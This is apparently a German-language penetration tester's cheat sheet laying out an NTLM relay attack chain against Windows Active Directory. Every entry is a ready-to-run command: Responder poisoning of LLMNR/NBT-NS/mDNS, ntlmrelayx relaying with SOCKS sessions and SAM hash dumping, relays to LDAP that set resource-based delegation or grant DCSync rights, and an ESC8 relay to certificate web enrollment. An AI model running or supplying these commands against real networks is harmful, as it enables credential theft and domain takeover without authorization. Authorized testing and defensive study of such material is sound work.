# PATH

#plateform/linux #target/remote #cat/RELAY

% p-relay, boris, ntlm, signing, nxc, targets, genrelaylist, poisoning
## [RELAY-a] nxc - Relay-Target-Liste (Hosts ohne SMB Signing)
Start des Relay-Wegs: erst Ziele ohne SMB-Signing sammeln.
```
nxc smb <target_range> --gen-relay-list <relay_file|smb_targets.txt>
```

% p-relay, boris, responder, poisoning, llmnr, nbtns, mdns, off
## [RELAY-b] Responder - SMB+HTTP OFF, dann Poisoning starten
SMB/HTTP aus, damit ntlmrelayx die Ports bekommt; Responder macht nur noch LLMNR/NBT-NS/mDNS.
```
sudo sed -i.bak 's/^SMB = On/SMB = Off/I; s/^HTTP = On/HTTP = Off/I' /etc/responder/Responder.conf && sudo responder -I <interface> -Pv
```

% p-relay, boris, ntlmrelayx, socks, impacket, hashes, sam, creds, dump
## [RELAY-c] ntlmrelayx - Relay starten (SOCKS + Hashes dumpen)
Relayt eingehende Auth auf die Signing-losen Ziele, oeffnet SOCKS-Sessions, dumpt SAM.
```
ulimit -n 10000; impacket-ntlmrelayx -tf <relay_file|smb_targets.txt> -smb2support -socks --output-file <output_file|ntlm_hashes.txt>
```

% p-relay, boris, socks, proxychains, nxc, session, shares
## [RELAY-d] SOCKS nutzen - relayte Session ueber proxychains (nxc)
Leeres -p '' : die Auth kommt aus der relayten SOCKS-Session, nicht aus Creds.
```
proxychains -q nxc smb <target_range> -u <user> -p '' -d <domain> --shares
```

% p-relay, boris, ntlmrelayx, ldap, delegate, rbcd, delegateaccess, impacket
## [RELAY-e] ntlmrelayx -> LDAP: RBCD setzen (Bruecke zum rbcd-Weg)
Coerce einen DC/Host (tippe coerce), relaye auf LDAP: --delegate-access legt ein Computerkonto an + traegt RBCD ein. Danach getST: tippe rbcd.
```
impacket-ntlmrelayx -t ldaps://<dc_fqdn> --delegate-access -smb2support --output-file <output_file|ntlm_hashes.txt>
```

% p-relay, boris, ntlmrelayx, escalate, adduser, ldap, privesc, dcsync
## [RELAY-f] ntlmrelayx -> LDAP: User escalaten (DCSync-Rechte)
Relay auf LDAP mit --escalate-user hebt einen kontrollierten User an (z.B. fuer DCSync).
```
impacket-ntlmrelayx -t ldaps://<dc_fqdn> --escalate-user <user> -smb2support
```

% p-relay, boris, ntlmrelayx, esc8, adcs, http, webenrollment, crossref
## [RELAY-g] ntlmrelayx -> ADCS ESC8 (Bruecke zum adcs-Weg)
Relay coerced DC-Auth auf die CA-Web-Enrollment -> Zertifikat. Alternative certipy-ad relay: tippe adcs.
```
impacket-ntlmrelayx -t http://<ca_fqdn>/certsrv/certfnsh.asp -smb2support --adcs --template <template|DomainController>
```
